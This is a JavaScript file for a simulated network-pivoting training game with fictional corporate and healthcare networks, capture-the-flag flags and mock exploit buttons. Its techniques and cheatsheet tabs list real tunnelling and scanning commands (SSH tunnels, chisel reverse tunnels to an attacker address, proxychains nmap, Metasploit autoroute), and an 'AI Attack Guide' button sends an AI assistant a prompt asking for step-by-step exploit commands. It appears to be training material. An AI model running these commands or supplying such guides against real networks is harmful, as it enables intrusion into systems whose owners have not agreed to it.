/* ==================== LATERAL MOVEMENT VISUALIZER 🕸️ ==================== */
/* Interactive Network Pivoting Simulator */

window.LateralMovement = {
    state: {
        tab: 'scenario',
        scenario: 0,
        compromised: ['attacker'],
        discovered: ['web'],
        currentNode: null,
        flags: {},
        tunnels: []
    },

    scenarios: [
        {
            name: 'Corporate Network Breach',
            desc: 'Start from external, pivot through DMZ to internal network',
            nodes: [
                { id: 'attacker', name: 'Attacker', type: 'attacker', x: 50, y: 250, ip: '10.10.14.5', os: 'Kali Linux', compromised: true },
                { id: 'web', name: 'Web Server', type: 'server', x: 200, y: 250, ip: '10.10.10.5', os: 'Ubuntu 20.04', services: ['HTTP/80', 'SSH/22'], vuln: 'CVE-2021-41773 (Path Traversal)', flag: 'FLAG{w3b_sh3ll_d3pl0y3d}', reveals: ['db', 'admin'] },
                { id: 'db', name: 'Database', type: 'database', x: 350, y: 150, ip: '192.168.1.10', os: 'MySQL 5.7', services: ['MySQL/3306'], vuln: 'Weak credentials (root:root)', flag: 'FLAG{sql_dump_4cqu1r3d}', reveals: ['backup'], internal: true },
                { id: 'admin', name: 'Admin PC', type: 'workstation', x: 350, y: 350, ip: '192.168.1.50', os: 'Windows 10', services: ['RDP/3389', 'SMB/445'], vuln: 'MS17-010 EternalBlue', flag: 'FLAG{4dm1n_pwn3d}', reveals: ['dc'], internal: true },
                { id: 'backup', name: 'Backup Server', type: 'server', x: 500, y: 150, ip: '192.168.1.20', os: 'Ubuntu 18.04', services: ['SSH/22', 'FTP/21'], vuln: 'SSH key reuse', flag: 'FLAG{b4ckup_l00t3d}', internal: true, reveals: [] },
                { id: 'dc', name: 'Domain Controller', type: 'dc', x: 500, y: 350, ip: '192.168.1.1', os: 'Windows Server 2019', services: ['LDAP/389', 'Kerberos/88', 'SMB/445'], vuln: 'ZeroLogon CVE-2020-1472', flag: 'FLAG{d0m41n_4dm1n_0wn3d}', internal: true, final: true }
            ],
            connections: [
                { from: 'attacker', to: 'web', type: 'public' },
                { from: 'web', to: 'db', type: 'internal' },
                { from: 'web', to: 'admin', type: 'internal' },
                { from: 'db', to: 'backup', type: 'internal' },
                { from: 'admin', to: 'dc', type: 'internal' }
            ]
        },
        {
            name: 'Healthcare Network',
            desc: 'Pivot from patient portal to medical records',
            nodes: [
                { id: 'attacker', name: 'Attacker', type: 'attacker', x: 50, y: 200, ip: '10.10.14.10', os: 'Kali', compromised: true },
                { id: 'portal', name: 'Patient Portal', type: 'server', x: 200, y: 200, ip: '10.10.10.15', os: 'Apache/PHP', services: ['HTTPS/443'], vuln: 'SQL Injection', flag: 'FLAG{p0rt4l_br34ch3d}', reveals: ['api', 'pacs'] },
                { id: 'api', name: 'API Server', type: 'server', x: 350, y: 100, ip: '172.16.0.10', os: 'Node.js', services: ['API/8080'], vuln: 'JWT None Algorithm', flag: 'FLAG{4p1_byp4ss3d}', internal: true, reveals: ['emr'] },
                { id: 'pacs', name: 'PACS Server', type: 'server', x: 350, y: 300, ip: '172.16.0.20', os: 'Windows', services: ['DICOM/104'], vuln: 'Default Credentials', flag: 'FLAG{m3d1c4l_1m4g3s}', internal: true, reveals: [] },
                { id: 'emr', name: 'EMR Database', type: 'database', x: 500, y: 200, ip: '172.16.0.5', os: 'PostgreSQL', services: ['PSQL/5432'], vuln: 'Credential Reuse', flag: 'FLAG{p4t13nt_d4t4_3xf1l}', internal: true, final: true }
            ],
            connections: [
                { from: 'attacker', to: 'portal', type: 'public' },
                { from: 'portal', to: 'api', type: 'internal' },
                { from: 'portal', to: 'pacs', type: 'internal' },
                { from: 'api', to: 'emr', type: 'internal' }
            ]
        }
    ],

    pivotTechniques: [
        { name: 'SSH Tunnel (Local)', cmd: 'ssh -L 3306:192.168.1.10:3306 user@10.10.10.5', desc: 'Forward remote port to local' },
        { name: 'SSH Tunnel (Dynamic)', cmd: 'ssh -D 9050 user@10.10.10.5', desc: 'SOCKS proxy through SSH' },
        { name: 'Chisel Server', cmd: 'chisel server -p 8000 --reverse', desc: 'Reverse tunnel server' },
        { name: 'Chisel Client', cmd: 'chisel client 10.10.14.5:8000 R:socks', desc: 'Connect back with SOCKS' },
        { name: 'Proxychains', cmd: 'proxychains nmap -sT 192.168.1.0/24', desc: 'Route through SOCKS proxy' },
        { name: 'Metasploit Pivot', cmd: 'run autoroute -s 192.168.1.0/24', desc: 'Add route in Meterpreter' },
        { name: 'Ligolo-ng', cmd: 'ligolo-ng -connect 10.10.14.5:11601', desc: 'Modern tunneling tool' },
        { name: 'SSH ProxyJump', cmd: 'ssh -J user@pivot user@internal', desc: 'Jump through host' }
    ],

    render() {
        const s = this.state;
        const sc = this.scenarios[s.scenario];
        return `
        <div class="lmv fade-in">
            <div class="lmv-h"><h1>🕸️ Lateral Movement Visualizer</h1><p>Network Pivoting Simulator</p></div>
            <div class="lmv-tabs">
                <button class="${s.tab === 'scenario' ? 'act' : ''}" onclick="LateralMovement.tab('scenario')">🎯 Scenario</button>
                <button class="${s.tab === 'techniques' ? 'act' : ''}" onclick="LateralMovement.tab('techniques')">🔧 Techniques</button>
                <button class="${s.tab === 'cheatsheet' ? 'act' : ''}" onclick="LateralMovement.tab('cheatsheet')">📋 Cheatsheet</button>
            </div>
            <div class="lmv-body">${this.renderTab()}</div>
        </div>
        <style>
        .lmv{min-height:100vh;background:linear-gradient(135deg,#0a0a12,#1a1a2e);color:#e0e0e0;padding:20px;font-family:system-ui}
        .lmv-h h1{margin:0;color:#10b981;font-size:1.8rem}.lmv-h p{color:#888;margin:5px 0 20px}
        .lmv-tabs{display:flex;gap:10px;margin-bottom:20px}.lmv-tabs button{padding:12px 24px;background:rgba(255,255,255,.05);border:1px solid #333;border-radius:8px;color:#888;cursor:pointer}
        .lmv-tabs button:hover{border-color:#10b981;color:#10b981}.lmv-tabs button.act{background:#10b981;color:#000;border-color:#10b981}
        .lmv-grid{display:grid;grid-template-columns:1fr 350px;gap:20px}
        .lmv-net{background:rgba(0,0,0,.4);border-radius:12px;padding:20px;position:relative;min-height:500px}
        .lmv-net h3{margin:0 0 15px;color:#10b981}
        .net-canvas{position:relative;width:100%;height:450px;background:linear-gradient(rgba(16,185,129,.05) 1px,transparent 1px),linear-gradient(90deg,rgba(16,185,129,.05) 1px,transparent 1px);background-size:20px 20px}
        .net-node{position:absolute;width:80px;text-align:center;cursor:pointer;transition:.3s}
        .net-node:hover{transform:scale(1.1)}
        .node-icon{width:60px;height:60px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:1.8rem;margin:0 auto 5px;border:2px solid #333}
        .node-icon.attacker{background:linear-gradient(135deg,#ef4444,#dc2626);border-color:#ef4444}
        .node-icon.server{background:linear-gradient(135deg,#3b82f6,#1d4ed8);border-color:#3b82f6}
        .node-icon.database{background:linear-gradient(135deg,#f59e0b,#d97706);border-color:#f59e0b}
        .node-icon.workstation{background:linear-gradient(135deg,#8b5cf6,#7c3aed);border-color:#8b5cf6}
        .node-icon.dc{background:linear-gradient(135deg,#ec4899,#db2777);border-color:#ec4899}
        .node-icon.hidden{background:#333;border-color:#555;opacity:.3}
        .node-icon.compromised{box-shadow:0 0 20px #22c55e;border-color:#22c55e}
        .node-name{font-size:.75rem;color:#fff}.node-ip{font-size:.65rem;color:#888}
        .net-line{position:absolute;height:2px;transform-origin:left center;pointer-events:none}
        .net-line.public{background:linear-gradient(90deg,#22c55e,#22c55e)}
        .net-line.internal{background:linear-gradient(90deg,#333,#555)}
        .net-line.tunnel{background:linear-gradient(90deg,#f59e0b,#eab308);height:3px;animation:pulse 1s infinite}
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
        .lmv-panel{background:rgba(0,0,0,.4);border-radius:12px;padding:20px}
        .lmv-panel h3{margin:0 0 15px;color:#10b981}
        .panel-node{padding:15px;background:#0a0a12;border-radius:10px;margin-bottom:15px}
        .panel-node h4{margin:0 0 10px;color:#fff;display:flex;align-items:center;gap:10px}
        .panel-node .tag{padding:2px 8px;border-radius:4px;font-size:.75rem}
        .tag-compromised{background:rgba(34,197,94,.2);color:#22c55e}.tag-internal{background:rgba(239,68,68,.2);color:#ef4444}
        .panel-info{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:10px 0}
        .info-item{font-size:.85rem}.info-label{color:#888}.info-value{color:#fff}
        .panel-services{margin:10px 0}.panel-services span{display:inline-block;padding:3px 8px;background:rgba(59,130,246,.2);color:#60a5fa;border-radius:4px;font-size:.8rem;margin:2px}
        .panel-vuln{padding:10px;background:rgba(239,68,68,.1);border-radius:8px;border-left:3px solid #ef4444;margin:10px 0}
        .panel-vuln h5{margin:0 0 5px;color:#ef4444}.panel-vuln p{margin:0;color:#fca5a5;font-size:.85rem}
        .panel-actions{display:flex;flex-direction:column;gap:8px;margin-top:15px}
        .panel-actions button{padding:10px;border-radius:8px;cursor:pointer;font-size:.9rem;border:1px solid}
        .btn-exploit{background:rgba(239,68,68,.2);border-color:#ef4444;color:#fca5a5}
        .btn-pivot{background:rgba(245,158,11,.2);border-color:#f59e0b;color:#fcd34d}
        .btn-ai{background:rgba(139,92,246,.2);border-color:#8b5cf6;color:#a78bfa}
        .flag-box{padding:15px;background:rgba(34,197,94,.1);border:1px solid #22c55e;border-radius:8px;margin-top:15px}
        .flag-box h5{margin:0 0 5px;color:#22c55e}.flag-box code{color:#86efac}
        .scenario-select{margin-bottom:20px}.scenario-select select{padding:10px 15px;background:#0a0a12;border:1px solid #333;border-radius:8px;color:#fff;width:100%}
        .progress-bar{height:8px;background:#333;border-radius:4px;margin:15px 0;overflow:hidden}
        .progress-fill{height:100%;background:linear-gradient(90deg,#22c55e,#10b981);transition:.3s}
        .tech-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:15px}
        .tech-card{background:rgba(0,0,0,.4);padding:20px;border-radius:12px;border-left:3px solid #f59e0b}
        .tech-card h4{margin:0 0 10px;color:#f59e0b}.tech-card p{color:#888;margin:0 0 10px;font-size:.9rem}
        .tech-card code{display:block;background:#0a0a12;padding:10px;border-radius:6px;color:#22c55e;font-size:.85rem;word-break:break-all}
        .tech-card button{margin-top:10px;padding:6px 12px;background:rgba(245,158,11,.2);border:1px solid #f59e0b;border-radius:6px;color:#fcd34d;cursor:pointer;font-size:.8rem}
        .legend{display:flex;gap:15px;flex-wrap:wrap;margin-bottom:20px;font-size:.85rem}
        .legend-item{display:flex;align-items:center;gap:5px}.legend-dot{width:12px;height:12px;border-radius:50%}
        @media(max-width:900px){.lmv-grid{grid-template-columns:1fr}}
        </style>`;
    },

    renderTab() {
        switch (this.state.tab) {
            case 'scenario': return this.renderScenario();
            case 'techniques': return this.renderTechniques();
            case 'cheatsheet': return this.renderCheatsheet();
        }
    },

    renderScenario() {
        const s = this.state;
        const sc = this.scenarios[s.scenario];
        const compromisedCount = s.compromised.length - 1;
        const totalNodes = sc.nodes.length - 1;
        const progress = Math.round((compromisedCount / totalNodes) * 100);

        return `
            <div class="scenario-select">
                <select onchange="LateralMovement.setScenario(this.value)">
                    ${this.scenarios.map((sc, i) => `<option value="${i}" ${s.scenario === i ? 'selected' : ''}>${sc.name}</option>`).join('')}
                </select>
            </div>
            <div class="legend">
                <div class="legend-item"><div class="legend-dot" style="background:#ef4444"></div> Attacker</div>
                <div class="legend-item"><div class="legend-dot" style="background:#22c55e"></div> Compromised</div>
                <div class="legend-item"><div class="legend-dot" style="background:#3b82f6"></div> Discovered</div>
                <div class="legend-item"><div class="legend-dot" style="background:#555"></div> Hidden</div>
            </div>
            <div class="progress-bar"><div class="progress-fill" style="width:${progress}%"></div></div>
            <p style="color:#888;font-size:.9rem;margin-bottom:20px">Progress: ${compromisedCount}/${totalNodes} hosts compromised</p>
            <div class="lmv-grid">
                <div class="lmv-net">
                    <h3>🌐 ${sc.name}</h3>
                    <div class="net-canvas">
                        ${this.renderConnections(sc)}
                        ${this.renderNodes(sc)}
                    </div>
                </div>
                <div class="lmv-panel">
                    <h3>📋 Host Details</h3>
                    ${s.currentNode ? this.renderNodePanel(sc.nodes.find(n => n.id === s.currentNode)) : '<p style="color:#666">Click a node to view details</p>'}
                </div>
            </div>`;
    },

    renderNodes(sc) {
        const s = this.state;
        return sc.nodes.map(n => {
            const isCompromised = s.compromised.includes(n.id);
            const isDiscovered = s.discovered.includes(n.id) || n.id === 'attacker';
            const isHidden = !isDiscovered;

            return `
                <div class="net-node" style="left:${n.x}px;top:${n.y}px" onclick="LateralMovement.selectNode('${n.id}')">
                    <div class="node-icon ${n.type} ${isCompromised ? 'compromised' : ''} ${isHidden ? 'hidden' : ''}">
                        ${this.getNodeIcon(n.type)}
                    </div>
                    <div class="node-name">${isHidden ? '???' : n.name}</div>
                    <div class="node-ip">${isHidden ? '?.?.?.?' : n.ip}</div>
                </div>
            `;
        }).join('');
    },

    renderConnections(sc) {
        const s = this.state;
        return sc.connections.map(c => {
            const from = sc.nodes.find(n => n.id === c.from);
            const to = sc.nodes.find(n => n.id === c.to);
            if (!from || !to) return '';

            const fromVisible = s.discovered.includes(c.from) || c.from === 'attacker';
            const toVisible = s.discovered.includes(c.to);
            if (!fromVisible || !toVisible) return '';

            const dx = (to.x + 40) - (from.x + 40);
            const dy = (to.y + 30) - (from.y + 30);
            const length = Math.sqrt(dx * dx + dy * dy);
            const angle = Math.atan2(dy, dx) * 180 / Math.PI;

            const isTunnel = s.tunnels.some(t => (t.from === c.from && t.to === c.to) || (t.from === c.to && t.to === c.from));

            return `<div class="net-line ${isTunnel ? 'tunnel' : c.type}" style="left:${from.x + 40}px;top:${from.y + 30}px;width:${length}px;transform:rotate(${angle}deg)"></div>`;
        }).join('');
    },

    renderNodePanel(node) {
        if (!node) return '<p style="color:#666">Node not found</p>';

        const s = this.state;
        const isCompromised = s.compromised.includes(node.id);
        const isDiscovered = s.discovered.includes(node.id) || node.id === 'attacker';

        if (!isDiscovered) return '<p style="color:#666">This host is not yet discovered. Compromise adjacent hosts first.</p>';

        return `
            <div class="panel-node">
                <h4>${this.getNodeIcon(node.type)} ${node.name}
                    ${isCompromised ? '<span class="tag tag-compromised">COMPROMISED</span>' : ''}
                    ${node.internal ? '<span class="tag tag-internal">INTERNAL</span>' : ''}
                </h4>
                <div class="panel-info">
                    <div class="info-item"><span class="info-label">IP:</span> <span class="info-value">${node.ip}</span></div>
                    <div class="info-item"><span class="info-label">OS:</span> <span class="info-value">${node.os}</span></div>
                </div>
                ${node.services ? `<div class="panel-services">${node.services.map(s => `<span>${s}</span>`).join('')}</div>` : ''}
                ${!isCompromised && node.vuln ? `
                    <div class="panel-vuln">
                        <h5>⚠️ Vulnerability</h5>
                        <p>${node.vuln}</p>
                    </div>
                ` : ''}
                ${isCompromised && node.flag ? `
                    <div class="flag-box">
                        <h5>🚩 Flag Captured!</h5>
                        <code>${node.flag}</code>
                    </div>
                ` : ''}
                <div class="panel-actions">
                    ${!isCompromised && node.id !== 'attacker' ? `<button class="btn-exploit" onclick="LateralMovement.exploit('${node.id}')">💥 Exploit</button>` : ''}
                    ${isCompromised && node.internal ? `<button class="btn-pivot" onclick="LateralMovement.pivot('${node.id}')">🔗 Setup Tunnel</button>` : ''}
                    <button class="btn-ai" onclick="LateralMovement.aiHelp('${node.id}')">🤖 AI Attack Guide</button>
                </div>
            </div>
            ${isCompromised && node.reveals?.length > 0 ? `<p style="color:#22c55e;font-size:.85rem;margin-top:10px">✓ New hosts discovered: ${node.reveals.join(', ')}</p>` : ''}
        `;
    },

    renderTechniques() {
        return `
            <h3 style="color:#f59e0b;margin:0 0 20px">🔧 Pivoting Techniques</h3>
            <div class="tech-grid">
                ${this.pivotTechniques.map(t => `
                    <div class="tech-card">
                        <h4>${t.name}</h4>
                        <p>${t.desc}</p>
                        <code>${t.cmd}</code>
                        <button onclick="navigator.clipboard.writeText('${t.cmd}')">📋 Copy</button>
                    </div>
                `).join('')}
            </div>`;
    },

    renderCheatsheet() {
        return `
            <h3 style="color:#10b981;margin:0 0 20px">📋 Lateral Movement Cheatsheet</h3>
            <div class="tech-grid">
                <div class="tech-card"><h4>1. Port Forwarding</h4><p>Forward internal port to attacker</p><code>ssh -L 8080:internal:80 user@pivot</code></div>
                <div class="tech-card"><h4>2. SOCKS Proxy</h4><p>Dynamic tunnel for all traffic</p><code>ssh -D 1080 user@pivot</code></div>
                <div class="tech-card"><h4>3. Proxychains Config</h4><p>Add to /etc/proxychains.conf</p><code>socks5 127.0.0.1 1080</code></div>
                <div class="tech-card"><h4>4. Scan Through Pivot</h4><p>Use proxychains for nmap</p><code>proxychains nmap -sT -Pn 192.168.1.0/24</code></div>
                <div class="tech-card"><h4>5. Metasploit Route</h4><p>Add route in meterpreter</p><code>run post/multi/manage/autoroute</code></div>
                <div class="tech-card"><h4>6. Chisel Reverse</h4><p>Tunnel without SSH</p><code>./chisel client ATTACKER:8080 R:socks</code></div>
            </div>`;
    },

    getNodeIcon(type) {
        const icons = { attacker: '💀', server: '🖥️', database: '🗄️', workstation: '💻', dc: '👑' };
        return icons[type] || '📦';
    },

    selectNode(id) { this.state.currentNode = id; this.rr(); },

    exploit(id) {
        const s = this.state;
        const sc = this.scenarios[s.scenario];
        const node = sc.nodes.find(n => n.id === id);
        if (!node) return;

        // Check if can reach (has path from compromised node)
        const canReach = sc.connections.some(c =>
            (c.to === id && s.compromised.includes(c.from)) ||
            (c.from === id && s.compromised.includes(c.to))
        );

        if (!canReach) {
            alert('❌ Cannot reach this host! Setup a tunnel from a compromised internal host first.');
            return;
        }

        // Simulate exploitation
        setTimeout(() => {
            s.compromised.push(id);
            s.flags[id] = node.flag;

            // Reveal new nodes
            if (node.reveals) {
                node.reveals.forEach(r => {
                    if (!s.discovered.includes(r)) s.discovered.push(r);
                });
            }

            alert(`✅ ${node.name} compromised!\n\n🚩 ${node.flag}\n\n${node.reveals?.length ? 'New hosts discovered: ' + node.reveals.join(', ') : ''}`);

            if (node.final) {
                setTimeout(() => alert('🎉 CONGRATULATIONS! You have fully compromised the network!'), 500);
            }

            this.rr();
        }, 1000);

        alert(`⏳ Exploiting ${node.name} via ${node.vuln}...`);
    },

    pivot(id) {
        const s = this.state;
        s.tunnels.push({ from: 'attacker', to: id });
        alert(`🔗 Tunnel established through ${id}!\n\nYou can now reach internal network hosts.`);
        this.rr();
    },

    aiHelp(id) {
        const sc = this.scenarios[this.state.scenario];
        const node = sc.nodes.find(n => n.id === id);
        if (!node || !window.AISecurityAssistant) return;

        const prompt = `I need to exploit ${node.name} (${node.ip}) running ${node.os}. Services: ${node.services?.join(', ')}. Known vulnerability: ${node.vuln}. Give me step-by-step attack guide with exact commands.`;

        AISecurityAssistant.toggle();
        setTimeout(() => { document.getElementById('ai-input').value = prompt; AISecurityAssistant.send(); }, 300);
    },

    setScenario(i) {
        this.state = { tab: 'scenario', scenario: parseInt(i), compromised: ['attacker'], discovered: ['web', 'portal'], currentNode: null, flags: {}, tunnels: [] };
        this.rr();
    },

    tab(t) { this.state.tab = t; this.rr(); },
    rr() { const app = document.querySelector('.lmv'); if (app) app.outerHTML = this.render(); }
};

function pageLateralMovement() { return LateralMovement.render(); }
